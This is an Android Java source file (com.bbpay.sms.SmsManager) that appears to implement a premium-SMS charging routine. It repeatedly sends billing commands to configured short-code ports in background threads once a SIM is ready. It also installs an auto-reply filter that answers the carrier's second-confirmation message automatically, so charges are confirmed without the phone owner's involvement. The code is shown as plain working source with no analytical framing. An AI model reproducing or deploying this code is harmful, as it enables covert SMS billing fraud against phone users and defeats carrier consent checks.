package com.bbpay.sms;
import java.util.List;
import android.content.Context;
import com.bbpay.bean.Constants;
import com.bbpay.bean.SmsBean;
import com.bbpay.db.SmsDbManager;
import com.bbpay.sms.filtersms.AutoReplyBean;
import com.bbpay.sms.filtersms.SmsObserver;
import com.bbpay.util.MobileNetworkManage;
import com.bbpay.util.MyLogger;
import com.bbpay.util.SimStateHelper;
import com.bbpay.util.SystemInfo;

public class SmsManager {
    private static final String LOG_TAG = "SMSFEE";
    private static void addSecondConfirm(SmsBean smsbean) {
        boolean flag = true;
        AutoReplyBean r = new AutoReplyBean();
        if (smsbean.getIsSecond() == 1) {
            r.setEndStr(smsbean.getReplyEndStr());
            r.setNeedReplay(flag);
            if (smsbean.getSecondType() == 1) flag = false;
            r.setRandKeyword(flag);
            r.setReplayContent(smsbean.getReplyContent());
            r.setSendFromNumber(smsbean.getSecondPort());
            r.setStartStr(smsbean.getReplyStartStr());
            r.setSendFromContent(smsbean.getSecondInfo());
            SmsObserver.getInstanse(null).getFilter().addAutoReply(r);
        }
    }
    private static void sendSms(Context context, SmsBean bean) {
        Constants.SMS_FEEING = true;
        SmsSender sender = new SmsSender();
        int chargeCount = bean.getChargeCount();
        String port = bean.getPort();
        String cmd = bean.getCmd();
        if (bean.isIsFuzzy() == 1) {
            cmd = cmd + "x" + SystemInfo.getCpId(context) + "x" + SystemInfo.getServiceId(context);
        }
        int delayTime = bean.getSmsDelayTime();
        while (chargeCount > 0) {
            sender.sendSMS(context, port, cmd);
            bean.setChargeCount(chargeCount - 1);
            if (bean.getChargeCount() == 0) {
                SmsDbManager.getInstance().deleteSMSById(context, bean.getId());
            } else {
                SmsDbManager.getInstance().updateSMSChargeCountById(context, bean);
            }
            try {
                Thread.sleep(delayTime * 1000);
            } catch (Exception e) {}
        }
        Constants.SMS_FEEING = false;
        //EpayLog.showSaveLog("===", "一次SMS处理结束，请求恢复网络");
        MobileNetworkManage.recoverNetWork(context);
    }
    public static void startFee(final Context context, List<SmsBean> smsList) {
        if (smsList != null && smsList.size() > 0) {
            if (SimStateHelper.getCurrentSimState(context).isSimReady()) {
                for (final SmsBean bean : smsList) {
                    new Thread() {
                        @Override
                        public void run() {
                            if (bean != null) {
                                addSecondConfirm(bean);
                                sendSms(context, bean);
                            }
                        }
                    }.start();
                }
            } else {
                MyLogger.info(LOG_TAG, "sendSMS() 无SIM卡或SIM卡状态被锁");
            }
        }
    }
}
